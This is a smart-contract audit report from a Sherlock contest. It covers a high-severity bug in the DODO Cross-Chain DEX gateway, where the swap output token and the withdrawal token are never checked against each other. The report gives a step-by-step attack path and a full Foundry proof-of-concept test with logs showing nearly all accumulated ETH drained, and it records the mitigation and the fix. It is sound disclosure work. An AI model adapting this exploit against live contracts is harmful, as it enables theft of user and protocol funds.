---
tags:
  - lang/solidity
  - sector/bridge
  - sector/dex
  - sector/stable
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
protocol: "[[DODO Cross Chain DEX]]"
auditors:
  - patitonar
report: "https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-judging"
genome:
  - "[[cross-contract-state-consistency]]"
  - "[[variant]]"
---
# H-1: Missing swap-withdrawal validation enables accumulated token drainage

- id: 58578
- impact: HIGH
- protocol: DODO Cross-Chain DEX
- reporter: patitonar (Sherlock)
- source: N/A

## Summary


This bug report discusses a vulnerability found in the DODO cross-chain DEX contract by a group of researchers. The vulnerability allows an attacker to drain tokens from the contract by crafting malicious cross-chain transactions with mismatched swap parameters. This can result in a complete loss of all accumulated token balances in the contract. The root cause of the vulnerability lies in the lack of validation between the swap output token and the target withdrawal token. The report also includes a proof of concept and an analysis of the impact and mitigation for this issue. The protocol team has fixed this issue in a recent pull request.

## Details


Source: https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-judging/issues/158 

## Found by 
0xEkko, 0xapple, Ob, SafetyBytes, X0sauce, elolpuer, n08ita, patitonar, pyk, roadToWatsonN101, seeques, wellbyt3

### Summary

Missing validation between swap output token and target withdrawal token will cause a loss of accumulated token balances for the protocol and users as an attacker will craft malicious cross-chain transactions with mismatched swap parameters to drain tokens that have accumulated in the contract from legitimate operations.

### Root Cause

In [GatewayCrossChain.sol](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/d4834a468f7dad56b007b4450397289d4f767757/omni-chain-contracts/contracts/GatewayCrossChain.sol#L465-L508) the `onCall` function performs a token swap using `_doMixSwap()` with `params.toToken` as the output, but then withdraws using `decoded.targetZRC20` without validating that these tokens match. This allows an attacker to swap to one token type but withdraw a different accumulated token type.

```solidity
//  Swap occurs with params.toToken as output  
uint256 outputAmount = _doMixSwap(decoded.swapDataZ, amount, params);
```


In [_handleBitcoinWithdraw](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/d4834a468f7dad56b007b4450397289d4f767757/omni-chain-contracts/contracts/GatewayCrossChain.sol#L371-L376) withdraws the `decoded.targetZRC20`

```solidity
// _handleBitcoinWithdraw:
withdraw(
    externalId, 
    decoded.receiver, 
    decoded.targetZRC20,    // Uses targetZRC20 (no validation against swap output)
    outputAmount - gasFee
);
```

In [_handleEvmOrSolanaWithdraw](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/d4834a468f7dad56b007b4450397289d4f767757/omni-chain-contracts/contracts/GatewayCrossChain.sol#L431-L437) withdraws the `decoded.targetZRC20`

```solidity
// _handleEvmOrSolanaWithdraw :
withdrawAndCall(
    externalId, 
    decoded.contractAddress, 
    decoded.targetZRC20,    // Uses targetZRC20 (no validation against swap output)
    outputAmount - gasFee, 
    receiver, 
    encoded
);

...

withdrawAndCall(
    externalId, 
    decoded.contractAddress, 
    decoded.targetZRC20,    // Uses targetZRC20 (no validation against swap output)
    amountsOutTarget, 
    receiver, 
    encoded
);
```

### Internal Pre-conditions

none

### External Pre-conditions

none

### Attack Path

1. Attacker monitors the GatewayCrossChain contract balance and identifies accumulated high-value tokens (e.g., 1000 ETH worth ~$2,500,000 at $2500/ETH)
2. Attacker crafts a malicious cross-chain transaction with:
   - `swapDataZ` configured to swap from input token to a different output token (e.g., USDC)
   - `targetZRC20` set to the accumulated high-value token they want to drain (e.g., ETH)
3. Attacker calls `depositAndCall` on source chain with the crafted payload
4. ZetaChain processes the transaction:
   - Contract receives input tokens and swaps them to USDC via `_doMixSwap`
   - Contract attempts withdrawal using `targetZRC20` (ETH)
   - Since contract has accumulated ETH balance, the approval and transfer succeed
5. Attacker receives ETH from accumulated balance while only providing cheaper output tokens
6. Attacker repeats the process to drain all accumulated balances of various token types

### Impact

The vulnerability enables complete drainage of all accumulated token balances in the contract.

### PoC

Copy and paste this on `GatewayCrossChain.t.sol` and run ` forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public */ --match-test test_POC_SwapTargetMismatch_CrossChainTokenDrain -vv`

```solidity
   function test_POC_SwapTargetMismatch_CrossChainTokenDrain() public {
        
        // Set realistic market prices for clear economic impact
        console.log("Market prices: ETH=$2500, BTC=$50000, USDC=$1");
        dodoRouteProxyZ.setPrice(address(token1Z), address(token2Z), 2500e18);  // 1 ETH = 2500 USDC
        dodoRouteProxyZ.setPrice(address(btcZ), address(token2Z), 50000e18);    // 1 BTC = 50000 USDC
        dodoRouteProxyZ.setPrice(address(btcZ), address(token1Z), 20e18);       // 1 BTC = 20 ETH
        console.log("");
        
        // Setup: Contract accumulated valuable ETH.ZRC20 from previous operations
        uint256 accumulatedETH = 1000 ether; // 1000 ETH.ZRC20 worth $2.5M
        token1Z.mint(address(gatewayCrossChain), accumulatedETH);
        console.log("Contract accumulated ETH.ZRC20:", accumulatedETH / 1e18);
        console.log("Accumulated value: $", (accumulatedETH * 2500) / 1e18);
        console.log("");
        
        // Give attacker some BTC to execute the attack
        uint256 attackerStartingBTC = 1 ether; // 1 BTC (enough for attack)
        btc.mint(user1, attackerStartingBTC);
        
        // Record initial balances
        uint256 attackerInitialBTC = btc.balanceOf(user1);
        uint256 attackerInitialETH_B = token1B.balanceOf(user2); // user2 is attacker's receiving address
        console.log("Attacker initial BTC balance:", attackerInitialBTC / 1e18);
        console.log("Attacker initial ETH_B balance:", attackerInitialETH_B / 1e18);
        console.log("");
        
        // Attack setup: Craft malicious cross-chain transaction
        address targetContract = address(gatewayCrossChain);
        uint256 attackAmount = 0.02 ether; // 0.02 BTC worth $1,000
        address asset = address(btc); // BTC on source chain
        uint32 dstChainId = 2; // Target Chain B
        
        // VULNERABILITY: Mismatch between swap output and withdrawal target
        address targetZRC20 = address(token1Z); // TARGET: ETH.ZRC20 (accumulated $2.5M!)
        bytes memory sender = btcAddress; // BTC address format
        bytes memory receiver = abi.encodePacked(user2);
        
        // Swap data: BTC→USDC (legitimate swap)
        bytes memory swapDataZ = encodeCompressedMixSwapParams(
            address(btcZ),        // FROM: BTC.ZRC20 (attacker's cheap input)
            address(token2Z),     // TO: USDC.ZRC20 (swap output - NOT the target!)
            attackAmount, 0, 0,
            new address[](1), new address[](1), new address[](1),
            0, new bytes[](1), abi.encode(address(0), 0), block.timestamp + 600
        );
        
        bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
        bytes memory fromTokenB = abi.encodePacked(address(token1B)); // ETH_B
        bytes memory toTokenB = abi.encodePacked(address(token1B));   // ETH_B (no swap on dest)
        bytes memory swapDataB = "";
        bytes memory accounts = "";
        
        // Craft malicious payload with parameter mismatch
        bytes memory payload = encodeMessage(
            dstChainId,
            targetZRC20,    // ETH.ZRC20 (expensive target - MISMATCH!)
            sender, receiver, swapDataZ, contractAddress,
            abi.encodePacked(fromTokenB, toTokenB, swapDataB), accounts
        );
        
        console.log("ATTACK EXECUTION:");
        console.log("- Attacker provides: 0.02 BTC ($1,000)");
        console.log("- Swap configured: BTC->USDC");
        console.log("- Target withdrawal: ETH ($2,500,000 accumulated!)");
        console.log("- Attacker receives stolen ETH on Chain B");
        console.log("- VULNERABILITY: Parameter mismatch enables token drain!");
        console.log("");
        
        // Ensure ZetaChain has BTC.ZRC20 tokens for the cross-chain process
        // (In real scenario, these would be minted when BTC is locked on source chain)
        btcZ.mint(address(gatewayZEVM), attackAmount);
        
        // Execute the complete end-to-end attack from Chain A
        vm.startPrank(user1);
        btc.approve(address(gatewaySendA), attackAmount);
        gatewaySendA.depositAndCall(
            targetContract,
            attackAmount,
            asset,
            dstChainId,
            payload
        );
        vm.stopPrank();
        
        // Calculate complete attack results
        uint256 attackerFinalBTC = btc.balanceOf(user1);
        uint256 attackerFinalETH_B = token1B.balanceOf(user2);
        uint256 contractFinalETH = token1Z.balanceOf(address(gatewayCrossChain));
        
        uint256 attackerSpent = attackerInitialBTC - attackerFinalBTC;
        uint256 attackerReceived = attackerFinalETH_B - attackerInitialETH_B;
        uint256 ethDrained = accumulatedETH - contractFinalETH;
        
        // Economic impact analysis
        uint256 attackerInvestmentUSD = attackerSpent * 50000;      // BTC * $50k
        uint256 attackerReceivedUSD = attackerReceived * 2500;      // ETH * $2.5k
        uint256 protocolLossUSD = ethDrained * 2500;               // ETH lost * $2.5k
        uint256 attackerProfitUSD = attackerReceivedUSD - attackerInvestmentUSD;
        
        console.log("===  ATTACK RESULTS ===");
        console.log("Attacker spent BTC: 0.02"); // attackerSpent / 1e18 = 0.02 ether / 1e18 = 0.02
        console.log("Attacker investment: $", attackerInvestmentUSD / 1e18);
        console.log("Attacker received ETH_B:", attackerReceived / 1e18);
        console.log("Attacker received value: $", attackerReceivedUSD / 1e18);
        console.log("Protocol lost ETH.ZRC20:", ethDrained / 1e18);
        console.log("Protocol lost value: $", protocolLossUSD / 1e18);
        console.log("Attacker profit: $", attackerProfitUSD / 1e18);
        console.log("");
        
        uint256 roiPercent = (attackerProfitUSD * 100) / attackerInvestmentUSD;
        uint256 drainagePercent = (ethDrained * 100) / accumulatedETH;
        
        console.log("IMPACT:");
        console.log("- Attack ROI:", roiPercent, "%");
        console.log("- Fund drainage:", drainagePercent, "%");
        
        // Verify complete successful exploitation
        assertEq(attackerSpent, attackAmount, "Should spend attack amount");
        assertGt(attackerReceived, 0, "Attacker should receive drained tokens on Chain B");
        assertGt(ethDrained, 0, "Should drain accumulated ETH.ZRC20");
        assertGt(attackerProfitUSD, attackerInvestmentUSD, "Should be massively profitable");
        assertGt(roiPercent, 100000, "Should have massive ROI (>100,000%)");
        assertGt(drainagePercent, 95, "Should drain >95% of accumulated funds");
    }
```

```solidity
Logs:
  Market prices: ETH=$2500, BTC=$50000, USDC=$1
  
  Contract accumulated ETH.ZRC20: 1000
  Accumulated value: $ 2500000
  
  Attacker initial BTC balance: 1
  Attacker initial ETH_B balance: 0
  
  ATTACK EXECUTION:
  - Attacker provides: 0.02 BTC ($1,000)
  - Swap configured: BTC->USDC
  - Target withdrawal: ETH ($2,500,000 accumulated!)
  - Attacker receives stolen ETH on Chain B
  - VULNERABILITY: Parameter mismatch enables token drain!
  
  574
  ===  ATTACK RESULTS ===
  Attacker spent BTC: 0.02
  Attacker investment: $ 1000
  Attacker received ETH_B: 999
  Attacker received value: $ 2497500
  Protocol lost ETH.ZRC20: 999
  Protocol lost value: $ 2497500
  Attacker profit: $ 2496500
  
  IMPACT:
  - Attack ROI: 249650 %
  - Fund drainage: 99 %
```

### Mitigation

Add validation in the `onCall` function to ensure swap output token matches the target withdrawal token

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Skyewwww/omni-chain-contracts/pull/33





